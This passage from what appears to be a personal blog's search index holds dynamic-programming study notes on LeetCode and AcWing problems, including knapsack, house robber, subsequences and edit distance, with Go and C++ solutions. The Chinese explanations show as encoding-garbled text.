    for j := 0; j &amp;lt;= amount; j++ {
        for i := 0; i &amp;lt; len(coins) ; i ++ {
            if j &amp;gt;= coins[i] {
                dp[j] = min(dp[j], dp[j - coins[i]] + 1)
            }
        }
    }

    if dp[amount] == amount + 1 {
        return -1
    }
    return dp[amount]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å®Œå…¨å¹³æ–¹æ•°&#34;&gt;å®Œå…¨å¹³æ–¹æ•°&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/perfect-squares/&lt;/p&gt;
&lt;p&gt;å’Œé›¶é’±å…‘æ¢æ˜¯ä¸€æ ·çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func min (x, y int) int {
    if x &amp;lt; y {
        return x
    }
    return y
}


func numSquares(n int) int {
    var dp [10005] int

    for i := 1; i &amp;lt;= n; i++ {
        dp[i] = n + 1
    }
    dp[1] = 1
    sqrtn := int(math.Sqrt(float64(n)))
    for i := 1; i &amp;lt; sqrtn + 1; i ++ {
        for j := 1; j &amp;lt;= n; j++ {
            if j &amp;gt;= i * i {
                dp[j] = min(dp[j], dp[j - i * i] + 1)
            }
        }
    }
    return dp[n]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å•è¯æ‹†åˆ†&#34;&gt;å•è¯æ‹†åˆ†&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/word-break/&lt;/p&gt;
&lt;p&gt;goçš„åˆ‡ç‰‡æ“ä½œæŠŠæˆ‘ç»•æ™•äº†ï¼Œè¿™ä¸ªå°±æ˜¯éå†æ•´ä¸ªå­—ç¬¦ä¸²ã€‚&lt;/p&gt;
&lt;p&gt;dp[j]ï¼šè¡¨ç¤ºå‰jå­—ç¬¦æ˜¯å¦å¯ä»¥è¢«æ‹†åˆ†æˆå­—å…¸é‡Œå‡ºç°è¿‡çš„å•è¯ã€‚é‚£ä¹ˆdp[j]å¯ç”±æ‰€æœ‰dp[j - wordDict[i]]æ¨å¾—ï¼Œåªè¦æœ‰ä¸€ä¸ªdp[j-wordDict[i]]ä¸ºtrueï¼Œé‚£ä¹ˆdp[j]å°±ä¸ºtrueã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–å•è¯å­—å…¸éå†å¿…é¡»åœ¨å†…å±‚ï¼Œå› ä¸ºå¦‚æœåœ¨å¤–å±‚ï¼Œæ„æ€å°±æ˜¯é€‰è¿‡çš„å•è¯ä¸èƒ½å†è¢«é€‰äº†ï¼Œæ˜¯ä¸ç¬¦åˆå®Œå…¨èƒŒåŒ…çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func wordBreak(s string, wordDict []string) bool {
    var dp [305]bool
    dp[0] = true

    for j := 1;  j&amp;lt;= len(s); j++ {
        for i := 0; i &amp;lt; len(wordDict); i++ {
            if j &amp;gt;= len(wordDict[i]) &amp;amp;&amp;amp; s[j - len(wordDict[i]):j] == wordDict[i] {
                dp[j] = dp[j - len(wordDict[i])] || dp[j]
            }
        }
    }
    return dp[len(s)]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å¤šé‡èƒŒåŒ…&#34;&gt;å¤šé‡èƒŒåŒ…&lt;/h2&gt;
&lt;p&gt;å¤šé‡èƒŒåŒ…å°±æ˜¯æ¯ä»¶ç‰©å“åŠ ä¸Šäº†æ¬¡æ•°çš„é™åˆ¶ï¼Œæ¯”å¦‚æ¯ä»¶ç‰©å“é™åˆ¶çš„æ¬¡æ•°ä¹Ÿä¸ä¸€å®šï¼Œå¤šé‡èƒŒåŒ…é—®é¢˜å¯ä»¥è½¬æ¢æˆ01èƒŒåŒ…ï¼Œå°±æ˜¯æŠŠæ¯ä»¶ç‰©å“æ‹†åˆ†å¼€æ¥ã€‚&lt;/p&gt;
&lt;h1 id=&#34;æ‰“å®¶åŠ«èˆ&#34;&gt;æ‰“å®¶åŠ«èˆ&lt;/h1&gt;
&lt;h2 id=&#34;æ‰“å®¶åŠ«èˆ-2&#34;&gt;æ‰“å®¶åŠ«èˆ&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber/&lt;/p&gt;
&lt;p&gt;dp[i]ï¼šå‰iä¸ªæˆ¿é—´æœ€å¤§çš„ä»·å€¼&lt;/p&gt;
&lt;p&gt;dp[i]é€’æ¨å…¬å¼ï¼šå¯¹äºç¬¬iä¸ªæˆ¿é—´ï¼Œå¦‚æœé€‰æ‹©å·ï¼Œé‚£ä¹ˆdp[i] = dp[i-2]+nums[i]ï¼Œå¦åˆ™dp[i] = dp[i-1]ï¼Œå› æ­¤dp[i] = max(dp[i-1],dp[i-2]+nums[i])ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;lt; y {
        return y
    }
    return x
}


func rob(nums []int) int {
    var dp [105] int
    dp[0] = nums[0]
    if len(nums) &amp;gt;= 2 {
        dp[1] = max(nums[0], nums[1])
    }
    for i := 2; i &amp;lt; len(nums); i++ {
        dp[i] = max(dp[i - 1], dp[i - 2] + nums[i])
    }
    return dp[len(nums) - 1]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ‰“å®¶åŠ«èˆ-ii&#34;&gt;æ‰“å®¶åŠ«èˆ IIâ€»&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber-ii/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜æ˜¯æŠŠé¦–å°¾çš„æˆ¿å­è¿æˆäº†ä¸€ä¸ªç¯ï¼Œå› æ­¤å¯ä»¥åŸºäºä¸¤ç§æƒ…å†µè€ƒè™‘ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸è€ƒè™‘ç¬¬ä¸€ä¸ªæˆ¿å­ï¼Œä»ç¬¬äºŒä¸ªå¼€å§‹&lt;/li&gt;
&lt;li&gt;ä»ç¬¬ä¸€ä¸ªæˆ¿å­å¼€å§‹ï¼Œä½†ä¸è€ƒè™‘æœ€åä¸€ä¸ª&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max (x, y int) int {
    if (x &amp;gt; y) {
        return x
    }
    return y
}
func rob(nums []int) int {
    if len(nums) == 1 {
        return nums[0]
    }
    var dp1 [105] int
    var dp2 [105] int
    dp1[0] = nums[0]
    dp2[1] = nums[1]
    if len(nums) &amp;gt; 1 {
        dp1[1] = max(nums[0], nums[1])
    }
    if len(nums) &amp;gt; 2 {
        dp2[2] = max(nums[1], nums[2])
    }
    for i := 2; i &amp;lt; len(nums); i++ {
        if i &amp;lt; len(nums) - 1 {
            dp1[i] = max(dp1[i - 1], dp1[i - 2] + nums[i])
        }
        if i &amp;gt; 2 {
            dp2[i] = max(dp2[i - 1], dp2[i - 2] + nums[i])
        }
    }
    return max(dp1[len(nums) - 2], dp2[len(nums) - 1])
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ‰“å®¶åŠ«èˆiiiæ ‘çŠ¶dp&#34;&gt;æ‰“å®¶åŠ«èˆâ…¢(æ ‘çŠ¶dp)â€»&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber-iii/&lt;/p&gt;
&lt;p&gt;å¯¹äºæ ‘çŠ¶çš„dpï¼Œé¦–å…ˆéœ€è¦éå†æ•´ä¸ªæ ‘ï¼Œé‚£ä¹ˆéœ€è¦é‡‡ç”¨åç»­éå†ï¼Œåªæœ‰è·å–å®Œå­èŠ‚ç‚¹çš„dpæ•°ç»„ä¹‹åï¼Œå†å†³å®šå½“å‰èŠ‚ç‚¹çš„çŠ¶æ€ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äºæ¯ä¸ªèŠ‚ç‚¹æœ‰ä¸¤ä¸ªçŠ¶æ€ï¼Œå°±æ˜¯å·å’Œä¸å·ã€‚å¦‚æœå·ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹å°±ä¸å¯ä»¥å·äº†ï¼›å¦‚æœä¸å·ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘å·å­èŠ‚ç‚¹çš„ï¼Œæ³¨æ„æ˜¯è€ƒè™‘ï¼Œå¹¶ä¸æ˜¯ä¸€å®šè¦å·ï¼Œéœ€è¦å–å­èŠ‚ç‚¹å·å’Œä¸å·çš„æœ€å¤§å€¼ã€‚&lt;/p&gt;
&lt;p&gt;å› æ­¤å¯¹äºæ¯ä¸ªèŠ‚ç‚¹åªéœ€è¦è¿”å›ä¸¤ä¸ªå€¼dp[2]å°±å¯ä»¥äº†ï¼Œdp[0]è¡¨ç¤ºä¸å·ï¼Œdp[1]è¡¨ç¤ºå·&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä¸å·å½“å‰èŠ‚ç‚¹çš„æœ€å¤§å€¼&lt;/p&gt;
&lt;p&gt;dp[0] = max(left.dp[0], left.dp[1]) + max(right.dp[0], right.dp[1])&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å·å½“å‰èŠ‚ç‚¹çš„æœ€å¤§å€¼&lt;/p&gt;
&lt;p&gt;dp[1] = root.val + left.dp[0] + right.dp[0]&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for a binary tree node.
 * type TreeNode struct {
 *     Val int
 *     Left *TreeNode
 *     Right *TreeNode
 * }
 */

func max (x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

// dp[0] ä¸å· dp[1] å·
func robTree(root *TreeNode) [2]int {
    if root == nil {
        return [2]int{0, 0}
    }
    var left, right, dp [2]int

    left = robTree(root.Left)
    right = robTree(root.Right)

    // å¯¹äºå½“å‰èŠ‚ç‚¹ä¸å·ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘å·å·¦å³å­©å­çš„ï¼Œæ³¨æ„æ˜¯è€ƒè™‘ï¼Œä¸æ˜¯ä¸€å®šå·
    dp[0] = max(left[0], left[1]) + max(right[0], right[1])
    // å¦‚æœå·ï¼Œé‚£ä¹ˆå·¦å³å­©å­çš„å°±ä¸èƒ½å·äº†
    dp[1] = root.Val + left[0] + right[0]

    return dp
}

func rob(root *TreeNode) int {
    var dp [2]int = robTree(root)
    return max(dp[0], dp[1])
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ²¡æœ‰ä¸Šå¸çš„èˆä¼š&#34;&gt;æ²¡æœ‰ä¸Šå¸çš„èˆä¼š&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/287/&lt;/p&gt;
&lt;p&gt;å’Œæ‰“å®¶åŠ«èˆâ…¢ä¸€æ ·æ˜¯æ ‘çŠ¶DPï¼Œä½†æ˜¯è¿™é“é¢˜æ˜¯ä¸å†æ˜¯äºŒå‰æ ‘ï¼Œè€Œæ˜¯å¤šå‰æ ‘ï¼Œä½†æ˜¯æ–¹æ³•è¿˜æ˜¯ä¸å˜ï¼Œå¯¹äºä¸€ä¸ªèŠ‚ç‚¹åªæœ‰å·å’Œä¸å·ä¸¤ä¸ªé€‰æ‹©ã€‚&lt;/p&gt;
&lt;p&gt;åªä¸è¿‡è¿™é“é¢˜çš„è¾“å…¥éœ€è¦è‡ªå·±æ„å»º....&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

type treeNode struct {
	Val int
	child []*treeNode
}

func max(x, y int) int {
	if x &amp;gt; y {
		return x
	}
	return y
}

func treeTrace(root *treeNode) [2]int {
	if root == nil {
		return [2]int{0, 0}
	}
	
	var dp [2]int
	for i := 0; i &amp;lt; len(root.child); i++ {
		tmp := treeTrace(root.child[i])
		dp[0] += max(tmp[0], tmp[1])
		dp[1] += tmp[0]
	}
	dp[1] += root.Val

	return dp
}

func main() {
	var n int
	var staffs []treeNode
	var flag [6005] int

	fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)

	for i := 0; i &amp;lt; n; i++ {
		var staff treeNode
		fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;staff.Val)
		staffs = append(staffs, staff)
	}

	for i := 0; i &amp;lt; n - 1; i++ {
		var l, k int
		fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;l, &amp;amp;k)
		flag[l] = 1
		staffs[k - 1].child = append(staffs[k - 1].child, &amp;amp;staffs[l - 1])
	}

	var root int
	for i := 1; i &amp;lt;= n; i++ {
		if flag[i] == 0 {
			root = i
			break
		}
	}
	var res = treeTrace(&amp;amp;staffs[root - 1])

	fmt.Println(max(res[0], res[1]))

}

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;å­åºåˆ—é—®é¢˜&#34;&gt;å­åºåˆ—é—®é¢˜&lt;/h1&gt;
&lt;h2 id=&#34;æœ€é•¿é€’å¢å­åºåˆ—&#34;&gt;æœ€é•¿é€’å¢å­åºåˆ—&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-increasing-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func lengthOfLIS(nums []int) int {
    var dp [2505]int
    var res int = 1
    for i := 0; i &amp;lt; len(nums); i++ {
        dp[i] = 1
    }

    for i := 0; i &amp;lt; len(nums); i++ {
        for j := 0; j &amp;lt; i; j++ {
            if nums[i] &amp;gt; nums[j] {
                dp[i] = max(dp[i], dp[j] + 1)
                if res &amp;lt; dp[i] {
                    res = dp[i]
                }
            }
        }
    }

    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æœ€é•¿è¿ç»­é€’å¢å­åºåˆ—&#34;&gt;æœ€é•¿è¿ç»­é€’å¢å­åºåˆ—&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}


func findLengthOfLCIS(nums []int) int {
    var dp [10005]int
    var res int = 1
    for i := 0; i &amp;lt; len(nums); i++ {
        dp[i] = 1
    }

    for i := 1; i &amp;lt; len(nums); i++ {
        if nums[i] &amp;gt; nums[i - 1] {
            dp[i] = dp[i - 1] + 1
        }
        if res &amp;lt; dp[i] {
            res = dp[i]
        }
    }

    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æœ€é•¿å…¬å…±å­åºåˆ—&#34;&gt;æœ€é•¿å…¬å…±å­åºåˆ—&lt;/h2&gt;
&lt;p&gt;å¾ˆæ˜¾ç„¶&lt;code&gt;dp[i][j]&lt;/code&gt;çš„å®šä¹‰ä¸ºtext1çš„å‰iä¸ªå­—ç¬¦å’Œtext2çš„å‰jä¸ªå­—ç¬¦çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„å­—ç¬¦ä¸ªæ•°ï¼Œé€’æ¨å…¬å¼ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœ&lt;code&gt;text1[i] == text[j]&lt;/code&gt;ï¼š&lt;code&gt;dp[i][j] = dp[i-1][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å¦‚æœ&lt;code&gt;text1[i] != text[j]&lt;/code&gt;: &lt;code&gt;dp[i][j] = max(dp[i-1][j], dp[i][j-1])&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-common-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func longestCommonSubsequence(text1 string, text2 string) int {
    var dp [1005][1005]int

    for i := 0; i &amp;lt; len(text1); i++ {
        for j := 0; j &amp;lt; len(text2); j++ {
            if text1[i] == text2[j] {
                dp[i + 1][j + 1] = dp [i][j] + 1
            } else {
                dp[i + 1][j + 1] = max(dp[i + 1][j], dp[i][j + 1])
            }
        }
    }
    
    return dp[len(text1)][len(text2)]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—&#34;&gt;æœ€é•¿è¿ç»­å…¬å…±å­åºåˆ—&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func findLength(nums1 []int, nums2 []int) int {
    var dp[1005][1005] int
    var res int = 0
    for i := 0; i &amp;lt; len(nums1); i++ {
        for j := 0; j &amp;lt; len(nums2); j++ {
            if nums1[i] == nums2[j] {
                dp[i+1][j+1] = dp[i][j] + 1
            }
            if res &amp;lt; dp[i+1][j+1] {
                res = dp[i+1][j+1]
            }
        }
    }

    return res

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æœ€çŸ­ç¼–è¾‘è·ç¦»&#34;&gt;æœ€çŸ­ç¼–è¾‘è·ç¦»&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/904/&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ·»åŠ ä¸€ä¸ªå­—æ¯ä¹‹åå˜å¾—ç›¸åŒï¼Œè¯´æ˜æ²¡æœ‰æ·»åŠ å‰açš„å‰iä¸ªå·²ç»å’Œbçš„å‰j-1ä¸ªå·²ç»ç›¸åŒ&lt;br&gt;
å³ ï¼š &lt;code&gt;dp[i][j] = dp[i][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åˆ é™¤è¯¥å­—æ¯ä¹‹åå˜å¾—ç›¸åŒï¼Œè¯´æ˜æ²¡æœ‰åˆ é™¤å‰aä¸­å‰i-1å·²ç»å’Œbçš„å‰jä¸ªå·²ç»ç›¸åŒ&lt;br&gt;
å³ ï¼š &lt;code&gt;dp[i][j] = dp[i-1][j] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ›¿æ¢è¯´æ˜å¯¹åº”ç»“å°¾å­—æ¯ä¸åŒï¼Œåˆ™çœ‹å€’æ•°ç¬¬äºŒä¸ª&lt;br&gt;
å³ï¼š &lt;code&gt;dp[i][j] = dp[i-1][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¸¤å­—ç¬¦ç›¸ç­‰ï¼š&lt;code&gt;dp[i][j] = dp[i-1][j-1]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func min(x, y, z int) int {
    if x &amp;lt;= y &amp;amp;&amp;amp; x &amp;lt;= z {
        return x
    } else if y &amp;lt;= x &amp;amp;&amp;amp; y &amp;lt;= z {
        return y
    } else {
        return z
    }
}

func main() {
    var m, n int
    var str1, str2 string
    var dp [1005][1005]int
    
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str1)
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;m)
    fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str2)

    for i := 1; i &amp;lt;= m; i++ {
        dp[0][i] = i
    }

    for i := 1; i &amp;lt;= n; i++ {
        dp[i][0] = i
    }
    
    for i := 0; i &amp;lt; n; i++ {
        for j := 0; j &amp;lt; m; j++ {
            if str1[i] == str2[j] {
                dp[i + 1][j + 1] = dp[i][j]
            } else {
                dp[i + 1][j + 1] = min(dp[i][j + 1], dp[i + 1][j], dp[i][j]) + 1
            }
        }
    }
    fmt.Println(dp[n][m])
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ç¼–è¾‘è·ç¦»&#34;&gt;ç¼–è¾‘è·ç¦»&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/901/&lt;/p&gt;
&lt;p&gt;å’Œä¸Šé¢˜æ²¡ä»€ä¹ˆå¤ªå¤§å·®åˆ«ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func min(x, y, z int) int {
	if x &amp;lt;= y &amp;amp;&amp;amp; x &amp;lt;= z {
		return x
	} else if y &amp;lt;= x &amp;amp;&amp;amp; y &amp;lt;= z {
		return y
	} else {
		return z
	}
}

func main() {
	var n, m int
	var str [1005]string

	fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;m)

	for i := 0; i &amp;lt; n; i++ {
		fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str[i])
	}
	for i := 0; i &amp;lt; m; i++ {
		var cnt, cntn int
		var pat string
		fmt.Scanf(&amp;quot;%s %d&amp;quot;, &amp;amp;pat, &amp;amp;cntn)
        
		for j := 0; j &amp;lt; n; j ++ {
			var dp [15][15]int
			for k := 1; k &amp;lt;= 11; k ++ {
				dp[k][0] = k
				dp[0][k] = k
			}
			
			for l := 0; l &amp;lt; len(str[j]); l++ {
				for o := 0; o &amp;lt; len(pat); o++ {
					if str[j][l] == pat[o] {
						dp[l+1][o+1] = dp[l][o]
					} else {
						dp[l+1][o+1] = min(dp[l][o+1], dp[l+1][o], dp[l][o]) + 1
					}
				}z
			}
			if cntn &amp;gt;= dp[len(str[j])][len(pat)] {
				cnt ++
			}
		}
		fmt.Println(cnt)
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å›æ–‡å­ä¸²åŒºé—´dp&#34;&gt;å›æ–‡å­ä¸²(åŒºé—´DP)&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/palindromic-substrings/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å¯ä»¥å®šä¹‰dp[i]è¡¨ç¤ºå‰iä¸ªå­—ç¬¦çš„å›æ–‡å­ä¸²çš„æ•°ç›®ã€‚&lt;br&gt;
é‚£ä¹ˆä¸‹æ¥åŒ…æ‹¬åˆ¤æ–­å­—ä¸²æ˜¯å¦æ˜¯å›æ–‡ä¸€å…±æ˜¯ä¸‰é‡å¾ªç¯äº†ï¼Œèƒ½é€šè¿‡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func palindrome(s string) bool {
    for i := 0; i &amp;lt; len(s); i++ {
        if s[i] != s[len(s) - i - 1] {
            return false
        }
    }
    return true
}

func countSubstrings(s string) int {

    var dp [1005]int

    for i := 1; i &amp;lt;= len(s); i++ {
        var cnt int = 0
        for j := 0; j &amp;lt; i; j++ {
            if palindrome(s[j:i]) {
                cnt ++
            }
        }
        dp[i] = dp[i-1] + cnt
    }

    return dp[len(s)]

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å…¶å®è¿™é“é¢˜æ›´å¥½çš„åšæ³•æ˜¯å®šä¹‰&lt;code&gt;dp[i][j]&lt;/code&gt;è¡¨ç¤ºä¸º&lt;code&gt;s[i:j]&lt;/code&gt;æ˜¯ä¸æ˜¯å›æ–‡ï¼Œå› æ­¤æ˜¯ä¸€ä¸ªåŒºé—´ï¼Œå¤–å±‚å¾ªç¯æ˜¯åŒºé—´çš„çª—å£å¤§å°ï¼Œå†…å±‚æ˜¯é€šè¿‡æ»‘åŠ¨çª—å£ã€‚&lt;br&gt;
åªæœ‰&lt;code&gt;s[i] == s[j] &amp;amp;&amp;amp; (i == 1 || dp[i+1][j-1])&lt;/code&gt;æ—¶ï¼Œ&lt;code&gt;dp[i][j] = true&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int countSubstrings(string s) {
        bool dp[1001][1001]={0};
        int res=s.length();
        for(int i=0;i&amp;lt;s.length();i++)
            dp[i][i]=1;        
        for(int i=1;i&amp;lt;=s.length();i++)
        {
            for(int j=0;j+i&amp;lt;s.length();j++)
            {
                if(s[j]==s[j+i] &amp;amp;&amp;amp; (j==j+i || j==i+j-1 || dp[j+1][i+j-1]))
                {
                    // cout&amp;lt;&amp;lt;j&amp;lt;&amp;lt;&amp;quot; &amp;quot;&amp;lt;&amp;lt;i+j&amp;lt;&amp;lt;endl;
                    dp[j][i+j]=1;
                    res++;
                }
            }
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;é—«æ°dpåˆ†ææ³•https://www.cnblogs.com/IzayoiMiku/p/13635809.html&lt;/p&gt;
&lt;/blockquote&gt;
">ã€ç®—æ³•ã€‘åŠ¨æ€è§„åˆ’</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/er-fen/"" data-c="
          &lt;h3 id=&#34;æ•´æ•°äºŒåˆ†&#34;&gt;æ•´æ•°äºŒåˆ†&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœå•è°ƒä¸€å®šå¯ä»¥äºŒåˆ†&lt;/li&gt;
&lt;li&gt;äºŒåˆ†ä¸ä¸€å®šå¿…é¡»å•è°ƒæ€§&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1620963231095.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;äºŒåˆ†æ¨¡æ¿åˆ†ä¸ºä¸¤ç§ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œè€ƒè™‘ä¸€ä¸‹&lt;code&gt;check()&lt;/code&gt;æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³ç¬¬ä¸€ç§æƒ…å†µéœ€è¦å°†&lt;code&gt;mid = (l+r+1)/2&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¾‹å¦‚ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°æ•°åˆ—&lt;code&gt;1 2 3 3 3 4&lt;/code&gt;ä¸­&lt;code&gt;3&lt;/code&gt;çš„å·¦å³åŒºé—´ï¼Œæ˜¾ç„¶æ˜¯&lt;code&gt;[2, 4]&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™é¦–å…ˆæŸ¥æ‰¾å…¶å·¦åŒºé—´ï¼Œæ‰¾å·¦åŒºé—´å°±æ˜¯å³ä¾¿&lt;code&gt;x==arr[mid]&lt;/code&gt;ï¼Œè¿˜æ˜¯è¦å°†å³æŒ‡é’ˆ&lt;code&gt;j&lt;/code&gt;å‘å·¦æŒªï¼Œè€Œæ‰¾å³åŒºé—´ï¼Œå³ä¾¿&lt;code&gt;x==arr[mid]&lt;/code&gt;ï¼Œå·¦æŒ‡é’ˆ&lt;code&gt;i&lt;/code&gt;è¿˜æ˜¯è¦å‘å³æŒªã€‚é‚£ä¹ˆä»£ç å¯ä»¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;æ‰¾å·¦åŒºé—´ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;while(i &amp;lt; j) // å·¦ä¸‹æ ‡
{
    mid = (i+j)/2;
    if(x &amp;gt; arr[mid]) // å¦‚æœ3&amp;gt;arr[mid]ï¼Œé‚£ä¹ˆæ˜¾ç„¶midä¸å†åŒºé—´[2, 4]å†…ï¼Œå› æ­¤i=mid+1
        i = mid + 1;
    else
        j = mid;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶å¾—åˆ°çš„&lt;code&gt;i&lt;/code&gt;åˆ™ä¸ºå·¦åŒºé—´2ã€‚&lt;/p&gt;
&lt;p&gt;æ‰¾å³åŒºé—´ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;while(i &amp;lt; j)
{
    mid = (i+j+1)/2; //è¿™é‡Œçš„+1æ˜¯ä¸ºäº†é˜²æ­¢æ­»å¾ªç¯ï¼Œä¾‹å¦‚i=3,j=4ï¼Œå¦‚æœä¸+1ï¼Œå°†ä¼šæ­»å¾ªç¯
    if(x &amp;gt;= arr[mid]) //å¦‚æœ3&amp;gt;=arr[mid]ï¼Œæ˜¾ç„¶midæ˜¯åœ¨åŒºé—´å†…çš„ï¼Œå› æ­¤i=mid
        i = mid;
    else
        j = mid - 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æœç´¢æ ‘&#34;&gt;äºŒå‰æœç´¢æ ‘&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1643609369084.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// ä»çŸ©é˜µçš„å³ä¸Šè§’çœ‹è¿™æ˜¯ä¸€ä¸ªäºŒå‰æœç´¢æ ‘
func findNumberIn2DArray(matrix [][]int, target int) bool {
    if len(matrix) == 0 || len(matrix[0]) == 0 {
        return false
    }
     i, j := 0, len(matrix[0]) - 1
